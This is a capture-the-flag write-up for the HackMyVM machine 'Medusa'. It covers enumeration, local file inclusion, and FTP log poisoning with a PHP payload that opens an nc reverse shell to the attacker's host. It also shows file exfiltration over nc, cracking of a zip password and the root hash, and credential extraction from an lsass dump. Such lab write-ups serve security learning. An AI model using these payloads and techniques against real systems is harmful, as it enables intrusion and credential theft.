---
layout: post
title: "HackMyVM - Medusa"
date: 2023-02-03 21:33:00 +0100
categories: hmv
tag: ["LFI", "LogPoison"]
---

Creator: [noname](https://hackmyvm.eu/profile/?user=noname)
Level: Easy
Release Date: 2023-02-01

## Scan

```
$ nmap -sC -sV -oA nmap/Medusa -p- 192.168.1.18
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 17:36 WET
Nmap scan report for 192.168.1.18
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70d4efc9276f8d957aa5511951fe14dc (RSA)
|   256 3f8d243fd25ecae6c9af372347bf1d28 (ECDSA)
|_  256 0c337e4e953db02d6a5eca39910d1308 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
```

### Gobuster (Directory Enumeration)

```
$ gobuster dir -u "http://192.168.1.18/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php 
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.18/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/03 17:52:23 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.18/manual/]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/hades                (Status: 301) [Size: 312] [--> http://192.168.1.18/hades/]

===============================================================
2023/02/03 17:59:37 Finished
===============================================================
```

### Gobuster (Files Enumeration)

```
$ gobuster dir -u "http://192.168.1.18/hades/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.18/hades/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/03 18:15:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 277]
/door.php             (Status: 200) [Size: 555]
/.php                 (Status: 403) [Size: 277]

===============================================================
2023/02/03 18:20:10 Finished
===============================================================
```

### Subdomain

```
$ curl http://192.168.1.18/hades/door.php      
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    
    <title>Door</title>
</head>
<body>
 <form action="d00r_validation.php" method="POST">
    <label for="word">Please enter the magic word...</label>
    <input id="word" type="text" required maxlength="6" name="word">
    <input type="submit" value="submit">
 </form>
</body>
</html>
```                                                                                                                                                                      

<img src="https://drive.google.com/uc?id=14k-B5mK2-CUf9DtAodu-cwZhjkO2gmwg"/>

```
$ curl http://192.168.1.18/hades/d00r_validation.php -X POST -d "word=Kraken"
```

```html
<head>
    <link rel="stylesheet" href="styles.css">
    <title>Validation</title>
</head>
<source><marquee>medusa.hmv</marquee></source>
```

### FFuF (SubDomain Enumeration)

```
$ sudo ffuf -u "http://medusa.hmv/" -H "Host: FUZZ.medusa.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 10674
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://medusa.hmv/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.medusa.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 10674
________________________________________________

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 2130ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1280 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

### Gobuster (Directory Enumeration)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.medusa.hmv -x php,txt,html -o medium-dev.log 
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/03/01 22:34:56 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]
/index.html           (Status: 200) [Size: 1973]
/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]
/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]
/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]
/robots.txt           (Status: 200) [Size: 489]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]

===============================================================
2023/03/01 22:36:06 Finished
===============================================================
```

### Gobuster (Files Enumeration)

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.medusa.hmv/files -x php,txt,html -o medium-dev-files.log
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/files
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/03/01 22:37:20 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 279]
/system.php           (Status: 200) [Size: 0]
/readme.txt           (Status: 200) [Size: 144]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]

===============================================================
2023/03/01 22:38:17 Finished
===============================================================
```

## LFI

```
$ sudo ffuf -r -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -fs 0
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 3ms]
```

```
$ curl http://dev.medusa.hmv/files/system.php?view=/etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

## Log Poisoning (/var/log/vsftpd.log)

```bash
$ lftp -u '<?php system("nc -e /bin/bash 192.168.1.6 4444"); ?>', 192.168.1.18
lftp <?php system("nc -e /bin/bash 192.168.1.6 4444"); ?>@192.168.1.18:~> ls
ls: Login failed: 530 Login incorrect.          
lftp <?php system("nc -e /bin/bash 192.168.1.6 4444"); ?>@192.168.1.18:~> exit
```

```bash
$ curl http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log 
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.18] 52318
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@medusa:/var/www/html/hades$ ^Z
zsh: suspended  nc -lvnp 4444

$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

www-data@medusa:/var/www/html/hades$ export TERM=xterm
www-data@medusa:/var/www/html/hades$ stty rows 28 cols 169
www-data@medusa:/var/www/html/hades$ 
```

## User Shell

```
$ find / -writable ! -path '/proc*' ! -path '/dev*' ! -path '/sys*' ! -path '/run*' 2>/dev/null
```

```bash
/usr/lib/systemd/system/cryptdisks.service
/usr/lib/systemd/system/x11-common.service
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/cryptdisks-early.service
/usr/lib/systemd/system/sudo.service
/usr/lib/systemd/system/rc.service
/usr/lib/systemd/system/rcS.service
/var/lib/php/sessions
/var/cache/apache2/mod_cache_disk
/var/tmp
/var/log/vsftpd.log
/var/lock
/tmp
/.../old_files.zip
www-data@medusa:/var/www/html/hades$
```

### Transfer OLD_FILES.ZIP

REMOTE:

```bash
$ nc -w 3 192.168.1.6 1234 < old_files.zip
```

HOST:

```bash
$ nc -l -p 1234 > old_files.zip 

$ ls -la                                                                      
total 12164
drwxr-xr-x  3 adok adok     4096 Mar  1 23:14  .
drwxr-xr-x 48 adok adok     4096 Feb  3 17:36  ..
-rw-r--r--  1 adok adok 12387024 Mar  1 23:15  old_files.zip
```

### Crack OLD_FILES.ZIP

```bash
$ unzip old_files.zip 
Archive:  old_files.zip
   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)

$ zip2john old_files.zip > hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 12386830 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
medusa666        (old_files.zip/lsass.DMP)     
1g 0:00:05:39 DONE (2023-03-01 23:23) 0.002943g/s 16663p/s 16663c/s 16663C/s meeker75..medabe15
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

$ 7z x old_files.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i3-3110M CPU @ 2.40GHz (306A9),ASM)

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

    
Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024

```

### pypykatz (lsass.DMP)

```bash
$ sudo pypykatz lsa --json minidump lsass.DMP
```

```bash
[...]
                        "password": "5p3ctr3_p0is0n_xX",
                        "password_raw": "35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000",
                        "pin": null,
                        "pin_raw": null,
                        "tickets": [],
                        "username": "spectre"
                    }
                ],
[...]
kerberos_creds": [
                    {
                        "cardinfo": null,
                        "credtype": "kerberos",
                        "domainname": "Medusa-PC",
                        "luid": 1000050,
                        "password": "Wh1t3_h4ck",
                        "password_raw": "570068003100740033005f006800340063006b0000000000",
                        "pin": null,
                        "pin_raw": null,
                        "tickets": [],
                        "username": "LordP4"
                    }
                ],
[...]
```

## ROOT

```bash
$ ssh spectre@medusa.hmv
Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
spectre@medusa:~$ 
```

### DebugFS

```bash
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            471M     0  471M   0% /dev
tmpfs            98M  512K   98M   1% /run
/dev/sda1       6.9G  2.4G  4.2G  36% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000

spectre@medusa:~$ /sbin/debugfs -w /dev/sda1
debugfs 1.46.2 (28-Feb-2021)

debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
```

### Crack ROOT password

```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a***o***a        (root)     
1g 0:00:00:33 DONE (2023-03-01 23:47) 0.02953g/s 110.5p/s 110.5c/s 110.5C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
